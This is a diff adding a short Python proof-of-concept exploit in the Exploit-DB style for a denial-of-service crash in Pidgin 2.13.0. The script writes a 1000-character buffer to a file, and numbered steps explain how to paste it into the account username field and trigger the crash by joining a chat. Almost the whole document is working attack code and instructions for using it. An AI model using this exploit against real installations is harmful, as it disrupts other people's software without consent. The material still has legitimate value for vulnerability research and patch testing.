@@ -1,0 +1,23 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: Pidgin 2.13.0 - Denial of Service (PoC)
+# Date: 24/05/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: https://pidgin.im/
+# Software https://cfhcable.dl.sourceforge.net/project/pidgin/Pidgin/2.13.0/pidgin-2.13.0.exe
+# Version: 2.13.0
+# Tested on: Windows 7, Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script 'pidgin.py', it will create a new file 'pidgin.txt'
+# 2.- Open Pidgin
+# 3.- Go to 'Accounts' > 'Manage Accounts'
+# 4.- Click 'Add...', paste the content of pidgin.txt into the field 'Username', 
+#     into the field 'Password' write anything, e.g. 1234 and click 'Add'
+# 5.- On the taskbar, click show hidden icons, right click on Pingin and select 'Join Chat...'
+# 6.- Now click 'Join' and crashed
+
+buffer = "\x41" * 1000
+
+f = open ("pidgin.txt", "w")
+f.write(buffer)
+f.close()
